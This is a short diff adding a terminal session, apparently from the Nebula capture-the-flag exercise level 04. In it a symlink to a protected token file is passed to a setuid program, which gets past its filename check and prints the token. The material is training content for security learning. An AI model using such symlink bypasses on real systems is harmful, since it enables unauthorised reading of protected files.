@@ -1,0 +1,3 @@
+level04@nebula:/home/flag04$ ln -s /home/flag04/token /tmp/blip
+level04@nebula:/home/flag04$ ./flag04 /tmp/blip
+06508b5e-8909-4f38-b630-fdb148a848a2
